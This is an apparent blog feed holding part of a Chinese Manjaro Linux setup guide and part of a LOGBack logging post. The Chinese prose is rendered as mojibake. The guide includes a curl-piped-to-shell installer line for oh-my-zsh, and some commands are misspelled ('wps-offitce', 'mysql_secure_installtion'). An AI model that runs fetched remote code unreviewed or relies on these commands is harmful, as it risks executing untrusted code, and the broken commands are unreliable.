<h3><span class="ez-toc-section" id="Proxychains">Proxychains</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S proxychains-ng
</code></pre>
<h2><span class="ez-toc-section" id="i-7">Êó•Â∏∏ËΩØ‰ª∂</span></h2>
<h3><span class="ez-toc-section" id="i-8">ÊêúÁãóËæìÂÖ•Ê≥ï</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S fcitx fcitx-qt4 fcitx-im  fcitx-configtool fcitx-sogoupinyin
</code></pre>
<p>ËÆæÁΩÆ <code>fcitx</code> ‰∏∫ÈªòËÆ§ËæìÂÖ•Ê≥ïÔºåÁºñËæë <code>~/.xprofile</code> Ôºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-shell">export GTK_IM_MODULE=fcitx
export QT_IM_MODULE=fcitx
export XMODIFIERS=@im=fcitx
</code></pre>
<p>ÂÆâË£ÖÂøÖÂ§áÂ≠ó‰ΩìÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S wqy-bitmapfont wqy-microhei \
  wqy-zenhei adobe-source-code-pro-fonts \
  adobe-source-han-sans-cn-fonts ttf-monaco
</code></pre>
<p>ÊàëÊúÄÁà±ÁöÑÁöÆËÇ§Ôºö<a href="https://pinyin.sogou.com/skins/detail/view/info/430641">ÈªëËâ≤ÁßëÊäÄ</a></p>
<h3><span class="ez-toc-section" id="RIME">RIME</span></h3>
<p>RIME ‰∏≠Â∑ûÈüµËæìÂÖ•Ê≥ïÊòØ Linux ‰∏ãÂπøÂèóÂ•ΩËØÑÁöÑ‰∏≠ÊñáËæìÂÖ•Ê≥ï„ÄÇÈâ¥‰∫éÊêúÁãóËæìÂÖ•Ê≥ïÁöÑ bug ‰∏çÊñ≠ÔºàQT4ÔºâÔºåÁ¨îËÄÖÊõ¥Êé®Ëçê RIME Êù•‰Ωú‰∏∫‰∏≠ÊñáËæìÂÖ•Ê≥ï„ÄÇ</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S fcitx-rime fcitx-cloudpinyin fcitx-googlepinyin
</code></pre>
<h3><span class="ez-toc-section" id="Telegram">Telegram</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S telegram-desktop
</code></pre>
<h3><span class="ez-toc-section" id="Dropbox">Dropbox</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S dropbox
</code></pre>
<h3><span class="ez-toc-section" id="i-9">ÂùöÊûú‰∫ë</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S nutstore
</code></pre>
<h3><span class="ez-toc-section" id="Typora">Typora</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S typora
</code></pre>
<h3><span class="ez-toc-section" id="oh-my-zsh">oh-my-zsh</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S zsh
$ sh -c "$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"
</code></pre>
<p>ÂÆâË£ÖÊèí‰ª∂Ôºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ git clone https://github.com/zsh-users/zsh-completions ~/.oh-my-zsh/custom/plugins/zsh-completions

$ git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/plugins/zsh-syntax-highlighting

$ git clone https://github.com/zsh-users/zsh-autosuggestions.git ~/.oh-my-zsh/plugins/zsh-autosuggestions

$ vim ~/.zshrc
  # edit plugins &amp; save
  plugins=(git zsh-syntax-highlighting docker docker-compose zsh-autosuggestions zsh-completions)

$ autoload -U compinit &amp;&amp; compinit
</code></pre>
<h3><span class="ez-toc-section" id="Google_Chrome">Google Chrome</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S google-chrome
</code></pre>
<h3><span class="ez-toc-section" id="i-10">ÁΩëÊòì‰∫ëÈü≥‰πê</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S netease-cloud-music
</code></pre>
<h3><span class="ez-toc-section" id="MailSpring">MailSpring</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S mailspring
$ sudo pacman -S libsecret
</code></pre>
<h3><span class="ez-toc-section" id="TIM">TIM</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S deepin-wine-tim
</code></pre>
<p>ËÆæÁΩÆ DPIÔºàÈ´òÂàÜÂ±èÔºâÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ env WINEPREFIX="$HOME/.deepinwine/Deepin-TIM" winecfg
</code></pre>
<p>Âú® <code>Graphics</code> ‰∏≠Â∞Ü DPI Ë∞ÉÊï¥‰∏∫ <code>120</code> „ÄÇ</p>
<h3><span class="ez-toc-section" id="WeChat">WeChat</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S deepin-wine-wechat
</code></pre>
<p>ËÆæÁΩÆ DPIÔºàÈ´òÂàÜÂ±èÔºâÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ env WINEPREFIX="$HOME/.deepinwine/Deepin-WeChat" winecfg
</code></pre>
<p>Âú® <code>Graphics</code> ‰∏≠Â∞Ü DPI Ë∞ÉÊï¥‰∏∫ <code>120</code> „ÄÇ</p>
<h3><span class="ez-toc-section" id="Thunder_Speed">Thunder Speed (ËøÖÈõ∑)</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S deepin-wine-thunderspeed
</code></pre>
<h3><span class="ez-toc-section" id="uGet_Aria2">uGet &amp; Aria2</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S uget aria2
</code></pre>
<blockquote><p>
  Â∞Ü <code>uGet -&gt; Edit -&gt; Settings -&gt; Plug-in</code> ‰∏≠ÁöÑËÆæÁΩÆËÆæ‰∏∫ aria2 „ÄÇ
</p></blockquote>
<h3><span class="ez-toc-section" id="WPS">WPS</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S ttf-wps-fonts
$ sudo pacman -S wps-offitce
</code></pre>
<h3><span class="ez-toc-section" id="Redshift_Night_light">Redshift (Night light)</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S redshift
</code></pre>
<h3><span class="ez-toc-section" id="Screenshot">Screenshot</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S deepin-screenshot
</code></pre>
<h2><span class="ez-toc-section" id="i-11">ÂºÄÂèëÁéØÂ¢É</span></h2>
<h3><span class="ez-toc-section" id="Vim">Vim</span></h3>
<p>ÊàëÊòØ Vim ÂÖö„ÄÇ</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ git clone --depth=1 https://github.com/amix/vimrc.git ~/.vim_runtime
$ sh ~/.vim_runtime/install_awesome_vimrc.sh
</code></pre>
<h3><span class="ez-toc-section" id="Git">Git</span></h3>
<p>Âú®‰πãÂâçÊàë‰ª¨Â∑≤ÁªèÂÆâË£ÖËøá‰∫Ü GitÔºåËøôÈáå‰∏ªË¶ÅÊòØ‰∏Ä‰∫õ Git ÁöÑÂü∫Êú¨ËÆæÁΩÆÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ git config --global user.name "Your_username"
$ git config --global user.email "your@email.com"
$ git config --global core.editor vim  # ‰ΩøÁî® Vim Êù•ÁºñËæë Git Êèê‰∫§‰ø°ÊÅØ
</code></pre>
<blockquote><p>
  ‰∏çË¶ÅÂøòËÆ∞Ê∑ªÂä†ÁîüÊàêÂπ∂Ê∑ªÂä† GPG key ÂñîÔΩû
</p></blockquote>
<h3><span class="ez-toc-section" id="Docker">Docker</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S docker
$ sudo pacman -S docker-compose
</code></pre>
<h3><span class="ez-toc-section" id="Java">Java</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/Java">Java - ArchWiki</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S java-runtime-common java-environment-common
$ yay jdk8  # Select extra/jdk8-openjdk
</code></pre>
<p>‰ΩøÁî® <code>archlinux-java</code> ÂëΩ‰ª§Êù•ÁÆ°ÁêÜ Java ÁéØÂ¢É„ÄÇ</p>
<p>Âàó‰∏æ Java ÁéØÂ¢ÉÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ archlinux-java status
</code></pre>
<p>ÈÄâÊã© Java ÁéØÂ¢ÉÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo archlinux-java set java-8-openjdk
</code></pre>
<h3><span class="ez-toc-section" id="Go">Go</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/Go">Go - ArchWiki</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S go go-tools
</code></pre>
<blockquote><p>
  ÂèØÈÄâÁî® <code>gcc-go</code> Ôºå‰ΩÜËã•ÈúÄË¶Å‰ΩøÁî® JetBrains ÁöÑ IDE ÂàôÂøÖÈ°ª‰ΩøÁî® <code>go</code> ÔºåÂê¶Âàô IDE Êó†Ê≥ïÂú® <code>/usr/lib/go</code> ‰∏ãÊâæÂà∞ Go SDK„ÄÇ
</p></blockquote>
<p>ÈÖçÁΩÆÁéØÂ¢ÉÂèòÈáè <code>GOPATH</code> Ôºå‰∏™‰∫∫ÂÅèÂ•ΩÂú®Áî®Êà∑ÁõÆÂΩï‰∏ãÁöÑ <code>go/</code> Êñá‰ª∂Â§πÊîæÁΩÆ Go Áõ∏ÂÖ≥Êñá‰ª∂„ÄÇ</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ vim ~/.zshrc  # OR ~/.bashrc OR ~/.profile

export GOPATH=~/go
export PATH=$PATH:$GOPATH/bin
</code></pre>
<p>Áî±‰∫éÊüê‰∫õÁâπÊÆäÁöÑÂéüÂõ†ÔºåÂõΩÂÜÖÊó†Ê≥ïÂæàÂ•ΩÂú∞ÊãâÂèñ Go Áõ∏ÂÖ≥ÁöÑËΩØ‰ª∂ÂåÖ„ÄÇÂª∫ËÆÆ‰ΩøÁî® <a href="https://github.com/goproxy/goproxy.cn">goproxy/goproxy.cn</a> ÔºåÂè™ÈúÄÂú®ÊãâÂèñÂâçËæìÂÖ•Ôºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ export GOPROXY=https://goproxy.cn
</code></pre>
<h3><span class="ez-toc-section" id="MariaDB">MariaDB</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/MariaDB">MariaDB- ArchWiki</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S mariadb
# install MariaDB
$ sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
# start MariaDB
$ sudo systemctl start mariadb
# config MariaDB using interactive wizard
$ sudo mysql_secure_installtion
</code></pre>
<p>Êõ¥ÊîπÈªòËÆ§ÁºñÁ†Å‰∏∫ <code>utf8mb4</code> Ôºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-ini">$ sudo vim /etc/my.cnf

# append following lines
[client]
default-character-set = utf8mb4

[mysqld]
collation_server = utf8mb4_unicode_ci
character_set_server = utf8mb4

[mysql]
default-character-set = utf8mb4
</code></pre>
<p>ÈáçÂêØ <code>MariaDB</code> ‰ª•ÁîüÊïà„ÄÇ</p>
<h3><span class="ez-toc-section" id="Redis">Redis</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/Redis">Redis - ArchWiki</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S redis
$ sudo systemctl start redis
</code></pre>
<h3><span class="ez-toc-section" id="Visual_Studio_Code">Visual Studio Code</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/Visual_Studio_Code">Visual Studio Code - ArchWiki</a></p>
<p>ÂÆáÂÆôÁ¨¨‰∏ÄÁºñËæëÂô®ÔºÅ</p>
<p>ÂèØ‰ª•‰ΩøÁî® Snapd Êù•ÂÆâË£ÖÔºåËßÅ<a href="https://snapcraft.io/install/code/manjaro">ËøôÈáå</a>„ÄÇ‰∏çËøáÁ¨îËÄÖÁõ¥Êé•Áî® <code>pacman</code> ÂÆâË£Ö‰∫ÜÔºåÂ¶Ç‰∏ãÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S visual-studio-code-bin
</code></pre>
<h3><span class="ez-toc-section" id="Sublime_Text">Sublime Text</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S sublime-text-dev
</code></pre>
<h3><span class="ez-toc-section" id="JetBrains_Toolbox">JetBrains Toolbox</span></h3>
<p><a href="https://aur.archlinux.org/packages/jetbrains-toolbox/">AUR - JetBrains Toolbox</a></p>
<p>JetBrains ÂÆ∂ÁöÑ IDE ‰∏ÄÂ∫î‰ø±ÂÖ®ÔºåÂ∫îÊúâÂ∞ΩÊúâÔºÅ</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S jetbrains-toolbox
# $ sudo pacman -S intellij-idea-ultimate-edition
</code></pre>
<h3><span class="ez-toc-section" id="Postman">Postman</span></h3>
<p>ÂêéÁ´ØÂºÄÂèëÂøÖÂ§á„ÄÇ</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S postman
</code></pre>
<h2><span class="ez-toc-section" id="KDE">KDE Êèí‰ª∂</span></h2>
<ul>
<li>Resource Monitor</p>
</li>
<li>
<p>Netspeed Widget</p>
</li>
<li>
<p>Redshift-control</p>
</li>
<li>
<p>Active Window Control</p>
</li>
<li>
<p>Global Menu</p>
</li>
<li>
<p>Latte Dock</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S latte-dock
</code></pre>
</li>
</ul>
<h2><span class="ez-toc-section" id="KDE-2">KDE ËÆæÁΩÆ</span></h2>
<p>‰∏™‰∫∫ÂñúÊ¨¢ÁöÑÊ°åÈù¢ËÆæÁΩÆ„ÄÇ</p>
<h3><span class="ez-toc-section" id="Displays">Displays</span></h3>
<p>Â±èÂπï 120% ÊîæÂ§ßÔºö <code>System Settings &gt; Displays &gt; Scale Display &gt; 1.2</code> „ÄÇ</p>
<h3><span class="ez-toc-section" id="Global_Menu">Global Menu</span></h3>
<p>Âõ†‰∏∫Êúâ‰∫Ü Latte DockÔºå‰∏çÂÜçÈúÄË¶Å‰ªªÂä°Ê†è‰∫ÜÔºåÂèñËÄå‰ª£‰πãÁöÑÊòØÂÖ®Â±ÄËèúÂçï„ÄÇÈúÄË¶ÅÊ∑ªÂä† <code>Global Menu</code> ÁöÑ Widget„ÄÇ</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S appmenu-gtk-module
$ sudo pacman -S libdbusmenu-glib  # For electron apps menu
</code></pre>
<p>ËØ¶ÊÉÖËßÅ<a href="https://forum.manjaro.org/t/gtk-global-menu-in-plasma-5-13/42112">Ê≠§Ë¥¥</a> „ÄÇ</p>
<h3><span class="ez-toc-section" id="Screen_Locking">Screen Locking</span></h3>
<p><code>System Settings &gt; Desktop Behavior &gt; Screen Locking &gt; Keyboard Shortcut</code> ËÆæ‰∏∫ <code>Meta + L</code> „ÄÇ</p>
<h3><span class="ez-toc-section" id="Effects">Effects</span></h3>
<p>KDE Ê°åÈù¢Âä®ÁîªÊïàÊûú„ÄÇ</p>
<p><code>System Settings &gt; Workspace Behavior &gt; Desktop Effects &gt; Configure Desktop Effects</code> ÔºåËÆæÁΩÆ‰Ω†ÂñúÊ¨¢ÁöÑÊ°åÈù¢ÊïàÊûú„ÄÇ</p>
<h3><span class="ez-toc-section" id="Window_Effects">Window Effects</span></h3>
<p>Á™óÂè£ÂàáÊç¢ÊïàÊûúÔºö<code>System Settings &gt; Window Management &gt; Task Switcher &gt; Main &gt; Visualization</code> ÔºåÂª∫ËÆÆ‰ΩøÁî® <code>Large Icons</code> „ÄÇ</p>
<h3><span class="ez-toc-section" id="Open_Files">Open Files</span></h3>
<p>KDE ÈªòËÆ§ÊòØÂçïÂáªÊâìÂºÄÊñá‰ª∂Ôºå‰ΩÜÊòØÁî®‰π†ÊÉØ Windows Âèä GNOME ÁöÑÊàë‰∏çÊòØÂæà‰π†ÊÉØÔºåÈÅÇÊîπ‰πãÔºö</p>
<p><code>System Settings &gt; Desktop Behavior &gt; Workspace &gt; Click Behavior &gt; Double-Click to open files and folders(single click to select)</code> .</p>
<h3><span class="ez-toc-section" id="Shortcuts">Shortcuts</span></h3>
<h4><span class="ez-toc-section" id="Global_Shortcuts">Global Shortcuts</span></h4>
<p><code>System Settings &gt; Shortcuts &gt; Global Shortcuts &gt; KWin</code></p>
<table>
<thead>
<tr>
<th align="left">Action</th>
<th align="left">Global</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">Switch One Desktop Down</td>
<td align="left">Meta+Ctrl+Down</td>
</tr>
<tr>
<td align="left">Switch One Desktop to the Left</td>
<td align="left">Meta+Ctrl+Left</td>
</tr>
<tr>
<td align="left">Switch One Desktop to the Right</td>
<td align="left">Meta+Ctrl+Right</td>
</tr>
<tr>
<td align="left">Switch One Desktop Up</td>
<td align="left">Meta+Ctrl+Up</td>
</tr>
<tr>
<td align="left">Window One Desktop Down</td>
<td align="left">Meta+Ctrl+Shift+Down</td>
</tr>
<tr>
<td align="left">Window One Desktop to the Left</td>
<td align="left">Meta+Ctrl+Shift+Left</td>
</tr>
<tr>
<td align="left">Window One Desktop to the Right</td>
<td align="left">Meta+Ctrl+Shift+Right</td>
</tr>
<tr>
<td align="left">Window One Desktop Up</td>
<td align="left">Meta+Ctrl+Shift+Up</td>
</tr>
<tr>
<td align="left">Maximize Window</td>
<td align="left">Meta+Up</td>
</tr>
<tr>
<td align="left">Minimize Windows</td>
<td align="left">Meta+Down</td>
</tr>
</tbody>
</table>
<p><code>System Settings &gt; Shortcuts &gt; Global Shortcuts &gt; Plasma</code></p>
<table>
<thead>
<tr>
<th align="left">Action</th>
<th align="left">Global</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">Open Klipper at Mouse Position</td>
<td align="left">Alt+D</td>
</tr>
</tbody>
</table>
<h4><span class="ez-toc-section" id="Custom_Shortcuts">Custom Shortcuts</span></h4>
<p><code>System Settings &gt; Shortcuts &gt; Custom Shortcuts &gt; Edit</code></p>
<p>Deepin Screenshot Êà™Â±èÂø´Êç∑ÈîÆÔºö</p>
<ul>
<li><code>New &gt; Global Shortcut &gt; Command/URL</code> Êñ∞Âª∫ÂÖ®Â±ÄËá™ÂÆö‰πâÂø´Êç∑ÈîÆ</li>
<li><code>Trigger</code> Ôºö <code>Ctrl</code> + <code>Alt</code> + <code>A</code> </li>
<li><code>Action</code> Ôºö <code>deepin-turbo-invoker --type=dtkwidget deepin-screenshot --icon</code> </li>
</ul>
<h3><span class="ez-toc-section" id="Desktop_Folder_Settings">Desktop Folder Settings</span></h3>
<p><code>Right click on Desktop &gt; Configure Desktop... &gt; Mouse Actions</code></p>
<p>Âà†Èô§ <code>Vertical-Scroll</code> Êù°ÁõÆÔºàÂèñÊ∂àÊªöÂä®ÂàáÊç¢Â∑•‰ΩúÂå∫Ôºâ„ÄÇ</p>
<h2><span class="ez-toc-section" id="i-12">‰∏ªÈ¢ò</span></h2>
<h3><span class="ez-toc-section" id="Adapta">Adapta</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S adapta-kde kvantum-theme-adapta adapta-gtk-theme
</code></pre>
<h2><span class="ez-toc-section" id="References">References</span></h2>
<ul>
<li><a href="https://yqsas.com/2019/03/03/manjaro-in-t480s/">ÊäòËÖæ‰πã Manjaro ÂÆâË£Ö‰ΩøÁî®ÊåáÂåó</a></li>
<li><a href="http://dejary.top/2019/01/23/Manjaro%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/">Manjaro Ë∏©ÂùëËÆ∞ÂΩï</a></li>
<li><a href="https://www.jianshu.com/p/f2c9ee00698c">Manjaro ÂàùÁ∫ßÂÖ•Èó®</a></li>
<li><a href="[https://vidotto.top/post/manjaro-ÂÆâË£ÖÈÖçÁΩÆÂ§áÂøò/](https://vidotto.top/post/manjaro-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%A4%87%E5%BF%98/)">Manjaro ÂÆâË£ÖÈÖçÁΩÆÂ§áÂøò</a></li>
<li><a href="https://ruiming.me/manjaro-linux/">Manjaro Linux ËøÅÁßªËÆ∞</a></li>
</ul>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/manjaro-quick-start/">Â∞ÜÂπ≤ÂáÄÁöÑ Manjaro Âø´ÈÄüÈÖçÁΩÆ‰∏∫Â∑•‰ΩúÁéØÂ¢É</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/java-logback-intro/</id>
        <title><![CDATA[Java Êó•ÂøóÂåÖ LOGBack ÁÆÄ‰ªã]]></title>
        <updated>2019-07-29T15:18:36+08:00</updated>
        <link href="https://blog.triplez.cn/java-logback-intro/"/>
        <content type="text/html" src="https://blog.triplez.cn/java-logback-intro/"><![CDATA[<h2><span class="ez-toc-section" id="i">ÂåÖÁ≤íÂ∫¶Á∫ßÂà´ÁªßÊâø</span></h2>
<p>‰∏ãÁ∫ßÁöÑÂåÖËã•Êó†ÁâπÂÆöËÆæÂÆöÊó•ÂøóÁ∫ßÂà´ÔºåÂàô‰ºöÁªßÊâø‰∏äÂ±ÇÂåÖÁöÑÊó•ÂøóÁ∫ßÂà´„ÄÇ</p>
<p>Â¶Ç‰∏ãË°®ÊâÄÁ§∫Ôºö</p>
<table>
<thead>
<tr>
<th>Êó•ÂøóÂô®ÔºàÂåÖÂêçÔºâ</th>
<th>ÂàÜÈÖçÊó•ÂøóÁ∫ßÂà´</th>
<th>ÁîüÊïàÊó•ÂøóÁ∫ßÂà´</th>
</tr>
</thead>
<tbody>
<tr>
<td>root</td>
<td>WARN</td>
<td>WARN</td>
</tr>
<tr>
<td>cn.triplez</td>
<td>none</td>
<td>WARN</td>
</tr>
<tr>
<td>cn.triplez.demo</td>
<td>DEBUG</td>
<td>DEBUG</td>
</tr>
</tbody>
</table>
<h2><span class="ez-toc-section" id="i-2">Êó•ÂøóÁ∫ßÂà´‰ºòÂÖàÁ∫ß</span></h2>
<p><code>TRACE</code> &lt; <code>DEBUG</code> &lt; <code>INFO</code> &lt; <code>WARN</code> &lt; <code>ERROR</code></p>
<h2><span class="ez-toc-section" id="i-3">Ëé∑ÂèñÊó•ÂøóÂô®</span></h2>
<p>Â§öÊ¨°Ëé∑ÂèñÁõ∏ÂêåÂêçÁß∞ÁöÑÊó•ÂøóÂô®Âàô‰ºöËøîÂõûÁõ∏ÂêåÂØπË±°ÁöÑÂºïÁî®„ÄÇ</p>
<h2><span class="ez-toc-section" id="Appenders_and_Layouts">Appenders and Layouts</span></h2>
<h2><span class="ez-toc-section" id="i-4">Âú®Êó•Âøó‰∏≠ÊèíÂÖ•ÂèòÈáèÂÄº</span></h2>
<p>ÂÅáÂ¶Ç‰Ω†ÊÉ≥ÂÜô‰∏ÄÊù°Ë∞ÉËØïÊó•ÂøóÔºåÂ¶Ç‰∏ãÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">logger.debug("Entry number: " + i + " is " + String.valueOf(entry[i]));
</code></pre>
<p>ËøôÊ†∑ÁöÑ‰ª£Á†ÅËøêË°åÊïàÁéáÊòØÂæà‰ΩéÁöÑÔºåÂõ†‰∏∫ËØ•ËØ≠Âè•‰ºöÂÖàÊãºÊé•Êó•ÂøóÂ≠óÁ¨¶‰∏≤ÔºåÂÜçËøõË°åÊòØÂê¶Á¨¶Âêà <code>DEBUG</code> Â±ÇÁ∫ßÁöÑÂà§Êñ≠„ÄÇÂõ†Ê≠§Ôºå‰Ω†ÂèØ‰ª•ÂÜôÊàêÂ¶Ç‰∏ãÂΩ¢Âºè‰ª•ÊèêÈ´òËøêË°åÈÄüÂ∫¶Ôºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">if (logger.isDebugEnabled()) {
  logger.debug("Entry number: " + i + " is " + String.valueOf(entry[i]));
}
</code></pre>
<h3><span class="ez-toc-section" id="i-5">Êõ¥Â•ΩÂú∞ÊñπÊ≥ï</span></h3>
<p>‰∫ãÂÆû‰∏äÔºåÂú® LOGBack ‰∏≠Êèê‰æõ‰∫ÜÊõ¥Â•ΩÁöÑÊãºÊé•ÊñπÊ≥ïÔºåÂÖ∂ËÉΩÂ§üÂü∫‰∫éÊ®°ÊùøÂ°´ÂÖÖÂèòÈáè„ÄÇÈúÄË¶ÅÂ°´ÂÖÖÁöÑÂèòÈáèÂè™ÈúÄÂú®Ê®°Êùø‰∏≠Áî® <code>{}</code> ‰ª£ÊõøÂç≥ÂèØÔºåËÄå‰∏îËØ•ÊñπÊ≥ïÊúâÂæàÂ•ΩÁöÑÊÄßËÉΩ<sup id="fnref-863-1"><a href="#fn-863-1" class="jetpack-footnote">1</a></sup>ÔºåÂÆÉËÉΩÂ§üÂÖàÂà§Êñ≠Êó•ÂøóÂ±ÇÁ∫ßÂÜçËøõË°åÂ≠óÁ¨¶‰∏≤ÁöÑÂ§ÑÁêÜ„ÄÇ‰∏æ‰∏™Ê†óÂ≠êÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">logger.debug("Hello, {}!", name);
</code></pre>
<p>‰πüÂèØ‰ª•ÂÜôÂ§ö‰∏™ÂèòÈáèÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">logger.debug("Hello, {}! I'm {}.", name, yourName);
</code></pre>
<p>Â¶ÇÊûúÊúâÂæàÂ§ö‰∏™ÂèòÈáèÔºå‰πüÂèØ‰ª•‰ΩøÁî® <code>Object[]</code> Êù•Êï¥ÂêàÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">Object[] paramArray = {val1, val2, val3};
logger.debug("Value 1: {}, Value 2: {}, Value 3: {}", paramArray);
</code></pre>
<h2><span class="ez-toc-section" id="i-6">‰∏ÄÁû•ÂÜÖÈÉ®ÂéüÁêÜ</span></h2>
<p>Êó∂Â∫èÂõæÔºö</p>
<p><img src="https://logback.qos.ch/manual/images/chapters/architecture/underTheHoodSequence2.gif" alt="sequence diagram" /></p>
<h2><span class="ez-toc-section" id="i-7">ÊÄßËÉΩ</span></h2>
<h3><span class="ez-toc-section" id="i-8">ÂÆåÂÖ®ÂÖ≥Èó≠Êó•ÂøóËÆ∞ÂΩïÂäüËÉΩ</span></h3>
<p>ÂΩìÊó•ÂøóÂäüËÉΩÂú®ËÆæÁΩÆÊñá‰ª∂‰∏≠Ë¢´ËÆæÁΩÆ‰∏∫ <code>Level.OFF</code>Ôºå Êó•ÂøóÂäüËÉΩ‰ºöË¢´ÂÖ≥Èó≠„ÄÇ‰ΩÜÊòØÔºåÂÜôÂú®Á®ãÂ∫è‰∏≠ÁöÑ <code>log</code> ËØ≠Âè•‰ªç‰ºö‰∫ßÁîü‰∏ÄÂÆöÁöÑÂºÄÈîÄÔºå‰∏ªË¶ÅÊòØÊñπÊ≥ïË∞ÉÁî®ÂíåÊï¥Êï∞ÊØîËæÉ„ÄÇ‰∏çËøáËøô‰∏™ÂºÄÈîÄÈùûÂ∏∏‰πãÂ∞èÔºåÊàë‰ª¨ÂÆåÂÖ®‰∏çÁî®ÊãÖÂøÉ„ÄÇ</p>
<p>‰∏çËøáÔºåÂú®Êüê‰∫õÂÜôÊ≥ï‰πã‰∏ãÔºåÊñπÊ≥ïË∞ÉÁî®‰ºö‰∫ßÁîüÈöêËóèÁöÑÂèòÈáèÊûÑÂª∫ÁöÑÂºÄÈîÄÔºåËøô‰∏ÄÁÇπÂú®ÂâçÈù¢Â∑≤ÁªèÊèêËøáÔºå‰∏æ‰∏™Ê†óÂ≠êÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">x.debug("Entryu number: " + i + "is " + entry[i]);
</code></pre>
<p>Â¶Ç‰∏äÁöÑÂÜôÊ≥ï‰ºö‰∫ßÁîüÈ¢ùÂ§ñÁöÑÂ≠óÁ¨¶‰∏≤ÊãºÊé•ÊàêÊú¨ÔºåÂÖ∂ÈúÄË¶ÅÂ∞Ü <code>i</code> Âíå <code>entry[i]</code> ÈÉΩËΩ¨Êç¢Êàê‰∏∫Â≠óÁ¨¶‰∏≤ÔºåÂπ∂Â∞ÜÂõõ‰∏™Â≠óÁ¨¶‰∏≤ÂØπË±°ÊãºÊé•Ëµ∑Êù•„ÄÇËÄåËøô‰∏™ËøáÁ®ãÊòØ‰∏éÊúâÊïàÂ±ÇÁ∫ßÊó†ÂÖ≥ÁöÑÔºå‰πüÂ∞±ÊòØËØ¥ÔºåÊó†ËÆ∫ÊòØÂê¶Êª°Ë∂≥ËæìÂá∫ËØ•Êù°Êó•ÂøóÁöÑÊù°‰ª∂ÔºåÈÉΩ‰ºöËøõË°åÂ≠óÁ¨¶‰∏≤ÁöÑÊãºÊé•Êìç‰Ωú„ÄÇ</p>
